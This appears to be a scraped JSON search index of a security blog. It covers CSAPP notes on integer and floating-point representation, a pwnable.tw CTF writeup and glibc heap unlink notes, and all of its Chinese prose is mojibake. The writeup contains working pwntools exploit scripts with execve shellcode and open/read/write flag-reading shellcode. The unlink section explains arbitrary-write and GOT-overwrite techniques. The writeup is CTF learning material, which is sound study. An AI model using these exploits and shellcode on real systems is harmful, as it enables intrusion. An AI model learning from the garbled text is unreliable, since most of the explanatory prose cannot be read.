ç¬¦å·æ•°è¿›è¡Œé€»è¾‘å³ç§»ï¼Œè€Œå¯¹äºè¡¥ç ï¼Œä¸ºäº†ä¿æŒå…¶ç¬¦å·çš„ä¸€è‡´ï¼Œè¿›è¡Œçš„æ˜¯ç®—æœ¯å³ç§»ã€‚ è¿™ä¹Ÿè§£é‡Šäº†ä¸ºä»€ä¹ˆå³ç§»æœ‰ä¸¤ç§ï¼Œè€Œå·¦ç§»åªæœ‰ä¸€ç§ã€‚ å¯¹äºè¡¥ç é™¤æ³•è¿˜æœ‰ä¸€ä¸ªèˆå…¥é—®é¢˜ï¼Œçœ‹ä¸‹é¢çš„ä¾‹å­ï¼š æ‰§è¡Œè¡¨è¾¾å¼$xÂ»k$ k \u003e\u003ek åè¿›åˆ¶ $-12340/2^k$ 0 1100111111001100 -12340 -12340.0 1 1110011111100110 -6170 -6170.0 4 1111110011111100 -772 -771.25 8 1111111111001111 -49 -48.203125 å¯ä»¥å‘ç°è¿›è¡Œç®—æœ¯å³ç§»åï¼Œç»“æœè¿›è¡Œäº†å‘ä¸‹èˆå…¥ï¼Œè€Œä¸æ˜¯å‘é›¶èˆå…¥ã€‚è¿™ä½¿æˆ‘ä»¬çš„æ•°äº§ç”Ÿäº†å¾ˆå¤§çš„åå·®ï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨â€œåç½®ï¼ˆbiasingï¼‰â€æ¥è¿›è¡Œä¿®æ­£ï¼š æ‰§è¡Œè¡¨è¾¾å¼$(x+(1Â«k)-1)Â»k$ k biasing -12340+biasing \u003e\u003ek åè¿›åˆ¶ $-12340/2^k$ 0 0 1100111111001100 1100111111001100 -12340 -12340.0 1 1 1100111111001101 1110011111100110 -6170 -6170.0 4 15 1100111111011011 1111110011111101 -771 -771.25 8 255 1101000011001011 1111111111010000 -48 -48.203125 ","date":"2021-01-20","objectID":"/csapp-lecture-01/:9:7","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 01","uri":"/csapp-lecture-01/#ä¸å¸¸æ•°çš„è¿ç®—"},{"categories":["Pwning"],"content":"Lecture 02: Floating point","date":"2021-01-20","objectID":"/csapp-lecture-02/:0:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 02","uri":"/csapp-lecture-02/#lecture-02-floating-point"},{"categories":["Pwning"],"content":"æµ®ç‚¹æ•°","date":"2021-01-20","objectID":"/csapp-lecture-02/:1:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 02","uri":"/csapp-lecture-02/#æµ®ç‚¹æ•°"},{"categories":["Pwning"],"content":"äºŒè¿›åˆ¶å°æ•°ä¸æ•´æ•°ä¸€æ ·ï¼Œä¸ªä½ä»£è¡¨$2^0$,é‚£ä¹ˆå°æ•°ç‚¹åçš„kä½æ•°å°±æ˜¯$2^{-k}$ã€‚ å¯¹äº$0.111â€¦111_2$è¿™æ ·åˆšå¥½å°äº1çš„æ•°ï¼Œä½¿ç”¨ç®€å•çš„$1.0-\\varepsilon$ã€‚ ä½†æ˜¯å¯¹äº$\\frac{1}{3}$è¿™æ ·çš„æ•°å°±ä¸èƒ½è¡¨ç¤ºï¼Œåªèƒ½è¿‘ä¼¼ã€‚ ","date":"2021-01-20","objectID":"/csapp-lecture-02/:1:1","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 02","uri":"/csapp-lecture-02/#äºŒè¿›åˆ¶å°æ•°"},{"categories":["Pwning"],"content":"IEEEæµ®ç‚¹è¡¨ç¤ºIEEEæµ®ç‚¹æ ‡å‡†ç”¨$V=(-1)^sÃ—MÃ—2^E$çš„å½¢å¼è¡¨ç¤ºä¸€ä¸ªæ•°ï¼š ç¬¦å·ï¼ˆsignï¼‰ så†³å®šè¿™æ•°æ˜¯è´Ÿæ•°ï¼ˆs=1ï¼‰è¿˜æ˜¯æ­£æ•°ï¼ˆs=0ï¼‰ã€‚ å°¾æ•°ï¼ˆsignificandï¼‰ Mæ˜¯ä¸€ä¸ªäºŒè¿›åˆ¶å°æ•°ï¼Œå®ƒçš„èŒƒå›´æ˜¯1~2-$\\varepsilon$,æˆ–0~1-$\\varepsilon$ é˜¶ç ï¼ˆexponentï¼‰ Eçš„ä½œç”¨æ˜¯å¯¹æµ®ç‚¹æ•°åŠ æƒï¼Œè¿™ä¸ªæƒé‡æ˜¯2çš„Eæ¬¡å¹‚ï¼ˆå¯èƒ½æ˜¯è´Ÿæ•°ï¼‰ å°†æµ®ç‚¹æ•°çš„ä½è¡¨ç¤ºåˆ’åˆ†ä¸ºä¸‰ä¸ªå­—æ®µï¼š ä¸€ä¸ªå•ç‹¬çš„ç¬¦å·ä½s kä½çš„é˜¶ç å­—æ®µ$exp=e_{k-1}e_{k-2}â€¦e_0$ç¼–ç é˜¶ç E nä½å°æ•°å­—æ®µ$frac=f_{n-1}f_{n-2}â€¦f_0$,ç¼–ç å°¾æ•°Mï¼Œå…¶çœŸå®å€¼ä¸Eçš„ç¼–ç æœ‰å…³ å¯¹äºè¿™äº›å­—æ®µçš„ä½ç½®æœ‰ç²¾åº¦çš„åˆ’åˆ†ï¼š cè¯­è¨€floatä¸­ï¼Œsã€expå’Œfracå­—æ®µåˆ†åˆ«ä¸º1ä½ã€k=8ä½å’Œ23ä½ï¼Œå…±32ä½ã€‚ cè¯­è¨€doubleä¸­ï¼Œsã€expå’Œfracå­—æ®µåˆ†åˆ«ä¸º1ä½ã€k=11ä½å’Œ52ä½ï¼Œå…±64ä½ã€‚ å•ç²¾åº¦çš„æ ¼å¼ä¹Ÿåˆ†ä¸ºå‡ ç§æƒ…å†µï¼š è§„æ ¼åŒ–çš„ sï¼ˆ31ï¼‰ expï¼ˆ30ï¼š23ï¼‰ fracï¼ˆ22ï¼š0ï¼‰ 0æˆ–1 â‰ 0\u0026â‰ 255 ~ è¿™ç§æƒ…å†µé˜¶ç çš„å€¼æ˜¯E=e-Biasï¼Œå…¶ä¸­eæ˜¯æ— ç¬¦å·æ•°ï¼Œå…¶ä½è¡¨ç¤ºä¸º$e_{k-1}e_{k-2}â€¦e_0$ï¼Œè€ŒBiasæ˜¯ä¸€ä¸ªç­‰äº$2^{k-1}-1$çš„åç½®å€¼ã€‚ fçš„ä½è¡¨ç¤ºä¸º$0.f_{n-1}f_{n-2}â€¦f_0$ï¼Œå°¾æ•°çš„å®šä¹‰ä¸ºM=1+fã€‚å³åœ¨è§„æ ¼åŒ–çš„æ ¼å¼ä¸­æ— æ³•è¡¨ç¤º0è¿™ä¸ªæ•°ï¼Œé‚£ä¹ˆæ—¢ç„¶ä¸èƒ½è¡¨ç¤ºï¼Œ1ä¹Ÿæ²¡æœ‰å¿…è¦å†™åœ¨å¼€å¤´å˜æˆ$1.f_{n-1}f_{n-2}â€¦f_0$ï¼Œè¿™ç§å°±æ˜¯éšå«çš„ä»¥1å¼€å¤´ã€‚ éè§„æ ¼åŒ–çš„ sï¼ˆ31ï¼‰ expï¼ˆ30ï¼š23ï¼‰ fracï¼ˆ22ï¼š0ï¼‰ 0æˆ–1 å…¨ä¸º0 ~ è¿™ç§æƒ…å†µé˜¶ç çš„å€¼æ˜¯E=1-Biasï¼Œå°¾æ•°çš„å®šä¹‰ä¸ºM=fã€‚è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥è¡¨ç¤º0ï¼Œå’Œéå¸¸æ¥è¿‘0çš„æ•°ã€‚ ç‰¹æ®Šçš„ æ— ç©·å¤§ï¼š sï¼ˆ31ï¼‰ expï¼ˆ30ï¼š23ï¼‰ fracï¼ˆ22ï¼š0ï¼‰ 0æˆ–1 å…¨ä¸º1 å…¨ä¸º0 NaNï¼ˆnot a numberï¼‰ sï¼ˆ31ï¼‰ expï¼ˆ30ï¼š23ï¼‰ fracï¼ˆ22ï¼š0ï¼‰ 0æˆ–1 å…¨ä¸º1 â‰ 0 ä¸‹é¢ç”¨ä¸€ä¸ªä¾‹å­æ¥åšæ¼”ç¤ºï¼š 6.91ï¼Œå…¶äºŒè¿›åˆ¶è¡¨ç¤ºä¸º$110.111010001111010111000_2$ å°†å…¶è§„æ ¼åŒ–ï¼Œ$6.91=(-1)^0Ã—1.10111010001111010111000_2Ã—2^2$ è¿™æ ·ä¸‰ä¸ªå­—æ®µçš„å€¼å°±å¾—åˆ°äº†ï¼š s=0 exp=E+Bias=$2+(2^{8-1}-1)$=129(åè¿›åˆ¶)=$1000 0001_2$ frac=10111010001111010111000 sï¼ˆ31ï¼‰ expï¼ˆ30ï¼š23ï¼‰ fracï¼ˆ22ï¼š0ï¼‰ 0 10000001 10111010001111010111000 0100 0000 1101 1101 0001 1110 1011 1000 4 0 D D 1 E B 8 ","date":"2021-01-20","objectID":"/csapp-lecture-02/:1:2","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 02","uri":"/csapp-lecture-02/#ieeeæµ®ç‚¹è¡¨ç¤º"},{"categories":["Pwning"],"content":"èˆå…¥ methods 1.40 1.60 1.50 2.50 -1.50 å‘å¶æ•°èˆå…¥ 1 2 2 2 -2 å‘é›¶èˆå…¥ 1 1 1 2 -1 å‘ä¸‹èˆå…¥ 1 1 1 2 -2 å‘ä¸Šèˆå…¥ 2 2 2 3 -1 ä¸€èˆ¬é‡‡ç”¨å‘å¶æ•°èˆå…¥ï¼Œå› ä¸ºåœ¨å¤§å¤šæ•°æƒ…å†µä¸‹å®ƒæ€»æ˜¯æœ‰æ•ˆçš„ã€‚å¯¹äºäºŒè¿›åˆ¶å°æ•°ï¼Œå°†æœ€ä½æœ‰æ•ˆä½çš„å€¼0è®¤ä¸ºæ˜¯å¶æ•°ï¼Œå€¼1è®¤ä¸ºæ˜¯å¥‡æ•°ã€‚ä¸€èˆ¬åœ¨$0.xxxxxâ€¦x100$çš„æƒ…å†µä¸‹è¿™ç§è§„åˆ™æ‰é€‚ç”¨ï¼Œ100ä¸ºè¦èˆå¼ƒçš„ä½ã€‚ Value Binary Rounded Action Rounded Value 2 3/32 10.00011 10.00 ï¼ˆ\u003c1/2â€“downï¼‰ 2 2 3/16 10.00110 10.01 (\u003e1/2â€“up) 2 1/4 2 7/8 10.11100 11.00 (1/2â€“up) 3 2 5/8 10.10100 10.10 (1/2â€“down) 2 1/2 å¯¹äºä¸Šé¢çš„ä¾‹å­ä¹¦ä¸Šè§£é‡Šä¸ºï¼šâ‘ ä¸â‘¡ä¸å¯èƒ½ä¸ºä¸¤ä¸ªå¯èƒ½å€¼çš„ä¸­é—´å€¼ï¼Œè€Œâ‘¢å’Œâ‘£å¯èƒ½ï¼Œä¸”æˆ‘ä»¬å€¾å‘äºä½¿æœ€ä½æœ‰æ•ˆä½ä¸ºé›¶ã€‚ ","date":"2021-01-20","objectID":"/csapp-lecture-02/:1:3","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 02","uri":"/csapp-lecture-02/#èˆå…¥"},{"categories":["Pwning"],"content":"æµ®ç‚¹æ•°ä¹˜æ³•æµ®ç‚¹æ•°è¿ç®—æ— æ³•ç›´æ¥é€šè¿‡åœ¨ä½å‘é‡ä¸Šè¿ç®—å¾—åˆ°ã€‚ å¯¹äºä¸¤ä¸ªæµ®ç‚¹æ•°$(-1)^{s_1}Ã—M_1Ã—2^{E_1}$å’Œ$(-1)^{s_2}Ã—M_2Ã—2^{E_2}$ï¼Œè®¡ç®—ç»“æœä¸º$(-1)^{s}Ã—MÃ—2^{E}$ï¼Œå…¶ä¸­$s=s_1XORS_2$ï¼Œ$M=M_1Ã—M_2$ï¼Œ$E=E_1+E_2$ã€‚ å¦‚æœ [å…¬å¼] ï¼Œå°±å°†fracå³ç§»ä¸€ä½ï¼Œå¹¶å¯¹EåŠ ä¸€ã€‚ å¦‚æœEè¶…è¿‡äº†è¡¨ç¤ºèŒƒå›´ï¼Œå°±å‘ç”Ÿäº†æº¢å‡ºã€‚ å¦‚æœMè¶…è¿‡äº†è¡¨ç¤ºèŒƒå›´ï¼Œå¯¹fracè¿›è¡Œèˆå…¥ã€‚ æ•°å­¦æ€§è´¨ï¼š å¯äº¤æ¢ ä¸å¯ç»“åˆï¼šå¯èƒ½å‡ºç°æº¢å‡ºå’Œä¸ç²¾ç¡®çš„èˆå…¥ï¼Œæ¯”å¦‚$1e20*(1e201e-20)-1e20$ï¼Œè€Œ$(1e201e20)*1e-20=INF$ ã€‚ ä¸å¯åˆ†é…ï¼šå¦‚æœåˆ†é…äº†å¯èƒ½ä¼šå‡ºç°NaNï¼Œæ¯”å¦‚$1e20*(1e20-1e20)=0$ï¼Œè€Œ$1e201e20-1e201e20=NaN$ ã€‚ ä¿è¯ï¼Œåªè¦$aâ‰ NaN$ï¼Œåˆ™$a*^taâ‰¥0$ã€‚ ","date":"2021-01-20","objectID":"/csapp-lecture-02/:1:4","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 02","uri":"/csapp-lecture-02/#æµ®ç‚¹æ•°ä¹˜æ³•"},{"categories":["Pwning"],"content":"æµ®ç‚¹æ•°åŠ æ³•å¯¹äºä¸¤ä¸ªæµ®ç‚¹æ•°$(-1)^{s_1}Ã—M_1Ã—2^{E_1}$å’Œ$(-1)^{s_2}Ã—M_2Ã—2^{E_2}$ï¼Œè®¡ç®—ç»“æœä¸º$(-1)^{s}Ã—MÃ—2^{E}$ï¼Œå…¶ä¸­sï¼ŒMæ˜¯å¯¹å…¶åçš„è¿ç®—ç»“æœï¼Œ$E=max(E_1,E_2)$ã€‚ å¦‚æœ$Mâ‰¥2$ï¼Œåˆ™fracå³ç§»ä¸€ä½ï¼Œå¹¶å¯¹EåŠ 1ã€‚ å¦‚æœ$M\u003c1$ ï¼Œåˆ™fracå·¦ç§»ä¸€ä½ï¼Œå¹¶å¯¹Eå‡1ã€‚ å¦‚æœEè¶…è¿‡è¡¨ç¤ºèŒƒå›´ï¼Œå°±å‘ç”Ÿæº¢å‡ºã€‚ å¦‚æœMè¶…è¿‡è¡¨ç¤ºèŒƒå›´ï¼Œå°±å¯¹fracè¿›è¡Œèˆå…¥ã€‚ æ•°å­¦æ€§è´¨ï¼š ç”±äºæº¢å‡ºï¼Œå¯èƒ½å¾—åˆ°æ— ç©·ã€‚ å¯äº¤æ¢ ä¸å¯ç»“åˆï¼ˆç”±äºèˆå…¥ï¼‰ï¼Œå› ä¸ºè¾ƒå¤§çš„æ•°å’Œè¾ƒå°çš„æ•°ç›¸åŠ ï¼Œç”±äºèˆå…¥é—®é¢˜ï¼Œä¼šå°†è¾ƒå°çš„æ•°èˆå…¥ï¼Œæ¯”å¦‚$(3.14+1e20)-1e20=0$è€Œ$3.14+(1e20-1e20)=3.14$ ã€‚ é™¤äº†æ— ç©·å’ŒNaNï¼Œå­˜åœ¨åŠ æ³•é€†å…ƒã€‚ æ»¡è¶³å•è°ƒæ€§ï¼Œå¦‚æœ$aâ‰¥b$ï¼Œåˆ™å¯¹äºä»»æ„aã€bå’Œxï¼Œéƒ½æœ‰$x+aâ‰¥x+b$ã€‚NaNé™¤å¤–ã€‚æ— ç¬¦å·æ•°å’Œè¡¥ç ç”±äºæº¢å‡ºä¼šå‘ç”Ÿå€¼çš„è·³å˜ï¼Œæ‰€ä»¥ä¸æ»¡è¶³å•è°ƒæ€§ã€‚ ","date":"2021-01-20","objectID":"/csapp-lecture-02/:1:5","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 02","uri":"/csapp-lecture-02/#æµ®ç‚¹æ•°åŠ æ³•"},{"categories":["Pwning"],"content":"homework x==(int)(float)xï¼šintæœ‰32ä½ï¼Œfloatå°¾æ•°æœ‰23ä½ï¼Œä»intå¼ºåˆ¶ç±»å‹è½¬æ¢åˆ°floatä¼šå‡ºç°èˆå…¥ï¼Œæ‰€ä»¥é”™è¯¯ã€‚ x==(int)(double)xï¼šintæœ‰32ä½ï¼Œdoubleå°¾æ•°æœ‰52ä½ï¼Œæ‰€ä»¥ä»intå¼ºåˆ¶ç±»å‹è½¬æ¢åˆ°floatä¸ä¼šå‡ºç°èˆå…¥ï¼Œæ‰€ä»¥æ­£ç¡®ã€‚ f==(float)(double)fï¼šdoubleçš„ç²¾åº¦å’ŒèŒƒå›´éƒ½æ¯”floatå¤§ï¼Œæ‰€ä»¥èƒ½å¤Ÿæ— æŸåœ°ä»floatå¼ºåˆ¶ç±»å‹è½¬æ¢åˆ°doubleï¼Œæ‰€ä»¥æ­£ç¡®ã€‚ d==(double)(float)dï¼šå› ä¸ºfloatçš„ç²¾åº¦å’ŒèŒƒå›´éƒ½æ¯”doubleå°ï¼Œå¯èƒ½ä¼šå‡ºç°æº¢å‡ºå’Œè¾“å…¥ï¼Œæ‰€ä»¥é”™è¯¯ã€‚ f==-(-f)ï¼šå› ä¸ºåªè¦æ”¹å˜ä¸€ä¸ªç¬¦å·ä½ï¼Œæ‰€ä»¥æ­£ç¡®ã€‚ 2/3==2/3.0ï¼š å› ä¸º2/3æ˜¯intç±»å‹ï¼Œä¼šèˆå…¥å˜æˆ0ï¼Œè€Œ2/3.0æ˜¯doubleç±»å‹ï¼Œä¼šå¾—åˆ°æ•°å€¼ï¼Œæ‰€ä»¥é”™è¯¯ã€‚ d\u003c0.0æ¨å‡º((d*2)\u003c0.0)ï¼šä¹˜2ç›¸å½“äºexpåŠ ä¸€ï¼Œå¦‚æœå‡ºç°æº¢å‡ºï¼Œä¹Ÿæ˜¯æ— ç©·å°ï¼Œæ‰€ä»¥æ­£ç¡®ã€‚ d\u003efæ¨å‡º-f\u003e-dï¼š åªè¦æ”¹å˜ä¸€ä¸ªç¬¦å·ä½ï¼Œæ‰€ä»¥æ­£ç¡®ã€‚ d*d\u003e=0.0ï¼š æ­£ç¡®ã€‚ (d+f)-d==fï¼šä¸ç¬¦åˆç»“åˆå¾‹ï¼Œå¯èƒ½ä¼šå‡ºç°èˆå…¥å’Œæº¢å‡ºã€‚ ","date":"2021-01-20","objectID":"/csapp-lecture-02/:1:6","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 02","uri":"/csapp-lecture-02/#homework"},{"categories":["Writeups"],"content":"Challenges_100-Week_3 Challenges Tricks pwnable.top-start shellcode pwnable.top-orw shellcode ","date":"2021-01-18","objectID":"/challenges-100-week-3/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 3","uri":"/challenges-100-week-3/#challenges_100-week_3"},{"categories":["Writeups"],"content":"start","date":"2021-01-18","objectID":"/challenges-100-week-3/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 3","uri":"/challenges-100-week-3/#start"},{"categories":["Writeups"],"content":"ida push esp push offset _exit xor eax, eax xor ebx, ebx xor ecx, ecx xor edx, edx push 3A465443h push 20656874h push 20747261h push 74732073h push 2774654Ch mov ecx, esp ; addr mov dl, 14h ; len mov bl, 1 ; fd mov al, 4 int 80h ; LINUX - sys_write xor ebx, ebx mov dl, 3Ch ; '\u003c' mov al, 3 int 80h ; LINUX - sys_read add esp, 14h retn pop esp xor eax, eax inc eax int 80h ; LINUX - sys_exit è°ƒè¯•ï¼š pwndbg\u003e vmmap LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA 0x8048000 0x8049000 r-xp 1000 0 /home/niebelungen/Desktop/pwnable.tw/start/start 0xf7ff8000 0xf7ffc000 r--p 4000 0 [vvar] 0xf7ffc000 0xf7ffe000 r-xp 2000 0 [vdso] 0xfffdd000 0xffffe000 rwxp 21000 0 [stack] æ²¡æœ‰è¶³å¤Ÿçš„gadgetè®©æˆ‘ä»¬åˆ©ç”¨ï¼Œæ­£å¥½stackæœ‰rwxæƒé™ï¼Œæ‰€ä»¥æˆ‘ä»¬æƒ³åŠæ³•åœ¨æ ˆä¸Šå†™shellcodeï¼Œå†retåˆ°é‚£é‡Œã€‚ é¦–å…ˆæˆ‘ä»¬è¦æƒ³åŠæ³•leakæ ˆçš„åœ°å€ã€‚ åœ¨add esp,14håï¼ŒespæŒ‡å‘äº†è¿”å›åœ°å€ï¼Œä¸‹ä¸€æ¡æŒ‡ä»¤å°±æ˜¯pop esp,è€Œæ ˆä¸Šä¿å­˜çš„å°±æ˜¯æ ˆçš„åœ°å€ã€‚é€šè¿‡retåˆ°mov ecx,espè°ƒç”¨sys_writeå¯ä»¥leakæ ˆåœ°å€ã€‚ç”±æ­¤ï¼Œå†åŠ ä¸Šä¸€ä¸ªoffsetå°±å¯ä»¥åˆ°shellcodeã€‚ æ³¨æ„è¦å†™å…¥çš„shellcodeå¿…é¡»è¦çŸ­ï¼Œ0x3c-0x14-0x4=0x24ã€‚ ","date":"2021-01-18","objectID":"/challenges-100-week-3/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 3","uri":"/challenges-100-week-3/#ida"},{"categories":["Writeups"],"content":"exp from pwn import * from LibcSearcher import LibcSearcher leak = lambda name,addr: log.success('{:#x}'.format(name,addr)) context.log_level=\"DEBUG\" #context.arch=\"amd64\" local=0 binary='./start' #gdb.attach(p) if local: p=process(binary) else: p=remote('chall.pwnable.tw',10000) elf = ELF(binary,checksec=False) #gdb.attach(p) shellcode='\\x31\\xc0\\x31\\xd2\\x52\\x68\\x2f\\x2f\\x73\\x68' shellcode+='\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\xb0\\x0b\\xcd\\x80'#0x17 payload='a'*0x14+p32(0x8048087) p.send(payload) p.recvuntil(\"Let's start the CTF:\") stack=u32(p.recv(4)) print hex(stack) payload='a'*0x14+p32(stack+20)+shellcode p.send(payload) p.interactive() pwnable.twçœŸçš„ä¸é”™ã€‚è¿™ä¸ªé¢˜è€ƒå¯Ÿäº†æ±‡ç¼–åŸºç¡€ã€shellcodeçš„ç¼–å†™ã€‚è¿™é‡Œè®°å½•ä¸€ä¸ªshellcodeçš„ç½‘ç«™ï¼šshellcode ","date":"2021-01-18","objectID":"/challenges-100-week-3/:2:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 3","uri":"/challenges-100-week-3/#exp"},{"categories":["Writeups"],"content":"orw","date":"2021-01-18","objectID":"/challenges-100-week-3/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 3","uri":"/challenges-100-week-3/#orw"},{"categories":["Writeups"],"content":"ida int __cdecl main(int argc, const char **argv, const char **envp) { orw_seccomp(); printf(\"Give my your shellcode:\"); read(0, \u0026shellcode, 0xC8u); ((void (*)(void))shellcode)(); return 0; } unsigned int orw_seccomp() { __int16 v1; // [esp+4h] [ebp-84h] BYREF char *v2; // [esp+8h] [ebp-80h] char v3[96]; // [esp+Ch] [ebp-7Ch] BYREF unsigned int v4; // [esp+6Ch] [ebp-1Ch] v4 = __readgsdword(0x14u); qmemcpy(v3, \u0026unk_8048640, sizeof(v3)); v1 = 12; v2 = v3; prctl(38, 1, 0, 0, 0); prctl(22, 2, \u0026v1); return __readgsdword(0x14u) ^ v4; } è¿™ä¸ªé¢˜ä½¿ç”¨äº†æ²™ç®±seccompç”¨æ¥é™åˆ¶ç³»ç»Ÿè°ƒç”¨ã€‚ä½ åªèƒ½ä½¿ç”¨open, read, writeçš„ç³»ç»Ÿè°ƒç”¨ã€‚ä½†æ˜¯æ²™ç®±å…¶å®è¿˜æœ‰æ›´å¤æ‚çš„æœºåˆ¶ï¼Œç”±äºä¸æœ¬é¢˜çš„é‡ç‚¹å…³ç³»ä¸å¤§æ‰€ä»¥ä¸å†èµ˜è¿°ã€‚ç”±äºé™åˆ¶ï¼Œæˆ‘ä»¬çš„shellcodeåªèƒ½ä½¿ç”¨ä¸Šè¿°çš„ä¸‰ä¸ªå‡½æ•°ã€‚ ","date":"2021-01-18","objectID":"/challenges-100-week-3/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 3","uri":"/challenges-100-week-3/#ida-1"},{"categories":["Writeups"],"content":"exp from pwn import * #from LibcSearcher import LibcSearcher leak = lambda name,addr: log.success('{:#x}'.format(name,addr)) context.log_level=\"DEBUG\" #context.arch=\"amd64\" local=0 binary='./orw' #gdb.attach(p) if local: p=process(binary) else: p=remote('chall.pwnable.tw',10001) elf = ELF(binary,checksec=False) #gdb.attach(p) file_name = \"/home/orw/flag\" shellcode = shellcraft.open(file_name) shellcode += shellcraft.read('eax','esp', 100) shellcode += shellcraft.write(1, 'esp', 100) shellcode = asm(shellcode) p.sendline(shellcode) p.interactive() æˆ‘è¿™é‡Œå–å·§äº†ï¼Œå…¶å®å®ƒçš„ç›®çš„æ˜¯è®©ä½ æ‰‹å†™æ±‡ç¼–ä»£ç ã€‚ ","date":"2021-01-18","objectID":"/challenges-100-week-3/:2:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 3","uri":"/challenges-100-week-3/#exp-1"},{"categories":["Pwning"],"content":"unlink /* Take a chunk off a bin list */ // unlink p #define unlink(AV, P, BK, FD) { if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) malloc_printerr (\"corrupted size vs. prev_size\"); FD = P-\u003efd; BK = P-\u003ebk; if (__builtin_expect (FD-\u003ebk != P || BK-\u003efd != P, 0)) malloc_printerr (check_action, \"corrupted double-linked list\", P, AV); else { FD-\u003ebk = BK; BK-\u003efd = FD; if (!in_smallbin_range (chunksize_nomask (P)) \u0026\u0026 __builtin_expect (P-\u003efd_nextsize != NULL, 0)) { if (__builtin_expect (P-\u003efd_nextsize-\u003ebk_nextsize != P, 0) || __builtin_expect (P-\u003ebk_nextsize-\u003efd_nextsize != P, 0)) malloc_printerr (check_action, \"corrupted double-linked list (not small)\", P, AV); if (FD-\u003efd_nextsize == NULL) { if (P-\u003efd_nextsize == P) FD-\u003efd_nextsize = FD-\u003ebk_nextsize = FD; else { FD-\u003efd_nextsize = P-\u003efd_nextsize; FD-\u003ebk_nextsize = P-\u003ebk_nextsize; P-\u003efd_nextsize-\u003ebk_nextsize = FD; P-\u003ebk_nextsize-\u003efd_nextsize = FD; } } else { P-\u003efd_nextsize-\u003ebk_nextsize = P-\u003ebk_nextsize; P-\u003ebk_nextsize-\u003efd_nextsize = P-\u003efd_nextsize; } } } } unlinké€‚ç”¨äºsmall binï¼Œä¸”åœ¨æœ€æ–°çš„libc2.27åŠä»¥ä¸Šä¸­ï¼ŒåŠ å…¥äº†æ–°çš„æœºåˆ¶ï¼Œè¯¥æ”»å‡»ä¸å†é‚£ä¹ˆé€‚ç”¨ã€‚ä½†æ˜¯å¯¹äºè¯¥æŠ€å·§çš„å­¦ä¹ ï¼Œæœ‰åŠ©äºæ›´å¥½çš„ç†è§£å †æ“ä½œã€‚ ","date":"2021-01-17","objectID":"/heap-unlink/:0:0","series":null,"tags":["Pwn"],"title":"Heap Unlink","uri":"/heap-unlink/#unlink"},{"categories":["Pwning"],"content":"æ—§çš„unlinkåœ¨æ—§çš„unlinkä¸­ï¼Œå¹¶æ²¡æœ‰sizeå’ŒåŒå‘é“¾è¡¨çš„æ£€æŸ¥ã€‚é‚£ä¹ˆunlinkæ“ä½œå°±ç›¸å½“äºæ‰§è¡Œäº†ä»¥ä¸‹æ“ä½œï¼š FD = P -\u003e fd; BK = P -\u003e bk; FD -\u003e bk = BK; BK -\u003e fd = FD; å‡è®¾æˆ‘ä»¬åœ¨P -\u003e fdä¸­å†™å…¥ç›®æ ‡åœ°å€ï¼šdest_addr - 0x18ï¼Œåœ¨P -\u003e bkä¸­å†™å…¥ä¿®æ”¹çš„åœ°å€ï¼ˆä¾‹å¦‚æŸå‡½æ•°çš„gotè¡¨åœ°å€ï¼‰expect_addrã€‚ä»¥ä¸Šå‡½æ•°ç›¸å½“äºï¼š FD = dest_addr - 0x18; BK = expect_addr; *(dest_addr - 0x18 + 0x18) = expect_addr *(expect_addr + 0x10) = dest_addr - 0x18 æˆ‘ä»¬å°†expect_addrå†™å…¥äº†dest_addrçš„ä½ç½®ã€‚é€šè¿‡è¿™ä¸€ç‚¹æˆ‘ä»¬å¯ä»¥å‘ä»»æ„çš„ä½ç½®å†™ä»»æ„çš„å€¼ã€‚ ","date":"2021-01-17","objectID":"/heap-unlink/:1:0","series":null,"tags":["Pwn"],"title":"Heap Unlink","uri":"/heap-unlink/#æ—§çš„unlink"},{"categories":["Pwning"],"content":"æ–°çš„unlinkæ·»åŠ äº†ä»¥ä¸‹æ£€æŸ¥æœºåˆ¶ï¼š Â·Â·Â· if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) malloc_printerr (\"corrupted size vs. prev_size\"); FD = P-\u003efd; BK = P-\u003ebk; if (__builtin_expect (FD-\u003ebk != P || BK-\u003efd != P, 0)) malloc_printerr (check_action, \"corrupted double-linked list\", P, AV); else { FD-\u003ebk = BK; BK-\u003efd = FD; Â·Â·Â· å®ƒè¦æ±‚FD-\u003ebk = BK-\u003efd = Pï¼Œå³*(P -\u003e fd+0x18)==*(P -\u003e bk+0x10)==Pï¼Œæ‰€ä»¥*(P -\u003e fd)=P-0x18ï¼Œ*(P -\u003e bk)=P-0x10ã€‚ æœ€ç»ˆå®ç°ï¼š *P=P-0x18 æ­¤æ—¶ï¼Œå†ç¼–è¾‘Pæ‰€æŒ‡chunkä¸ºæŸgotè¡¨ï¼Œå°±å¯ä»¥å¯¹gotè¿›è¡Œç¼–è¾‘ã€‚ åº”ç”¨çš„åœºæ™¯ï¼Œå­˜åœ¨ä¸€ä¸ªç®¡ç†å †æŒ‡é’ˆçš„æ•°ç»„ï¼Œè¿™ä¸ªæ•°ç»„æˆ‘ä»¬æ— æ³•ç›´æ¥æ“ä½œï¼Œä½†æ˜¯å…¶Pçš„é™„è¿‘ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡unlinkæ”¹å˜å…¶ä¸­çš„å€¼ï¼Œå†å°†PæŒ‡å‘æˆ‘ä»¬æƒ³å†™å…¥çš„åœ°å€ï¼ˆgotè¡¨ï¼‰ï¼Œå®ç°ä»»æ„åœ°å€å†™ã€‚ å¦å¤–ï¼Œå› 